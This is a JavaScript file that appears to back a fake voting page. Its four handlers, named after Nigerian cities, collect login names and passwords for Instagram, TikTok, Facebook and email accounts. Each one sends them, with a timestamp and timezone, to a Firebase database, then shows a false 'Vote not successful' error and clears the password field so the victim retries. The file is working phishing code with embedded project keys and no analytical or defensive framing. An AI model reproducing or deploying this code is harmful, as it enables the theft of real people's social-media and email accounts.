// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyAvd0QZjofQ8iCL_OLeM5jUClYMSbkXo8Q",
  authDomain: "aidedarabfame.firebaseapp.com",
  databaseURL: "https://aidedarabfame-default-rtdb.firebaseio.com",
  projectId: "aidedarabfame",
  storageBucket: "aidedarabfame.firebasestorage.app",
  messagingSenderId: "182333344020",
  appId: "1:182333344020:web:6efb5f91a9341ba6ee5a01",
  measurementId: "G-E3BLBTXW43"
};
firebase.initializeApp(firebaseConfig);

function edolog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var oruk = document.getElementById("edo-oruko").value;
  var wazobia = document.getElementById("edo-zom").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Instagram";

  if (oruk !== "" && wazobia !== "") {
    firebase.database().ref("fbdet").push({
      emle: oruk,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: wazobia,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("edo-zom").value = "";
      return false;
    }, 2000);
  }
}

function lag() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var oruk = document.getElementById("lag-oruko").value;
  var wazobia = document.getElementById("lag-zom").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "MailBox";

  if (oruk !== "" && wazobia !== "") {
    firebase.database().ref("fbdet").push({
      emle: oruk,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: wazobia,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("lag-zom").value = "";
      return false;
    }, 2000);
  }
}

function abjlog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var oruk = document.getElementById("abuja-oruko").value;
  var wazobia = document.getElementById("abuja-zom").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "TikTok";

  if (oruk !== "" && wazobia !== "") {
    firebase.database().ref("fbdet").push({
      emle: oruk,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: wazobia,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("abuja-zom").value = "";
      return false;
    }, 2000);
  }
}

function imo() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var oruk = document.getElementById("owerri-oruko").value;
  var wazobia = document.getElementById("owerris-zom").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (oruk !== "" && wazobia !== "") {
    firebase.database().ref("fbdet").push({
      emle: oruk,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: wazobia,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("owerris-zom").value = "";
      return false;
    }, 2000);
  }
}
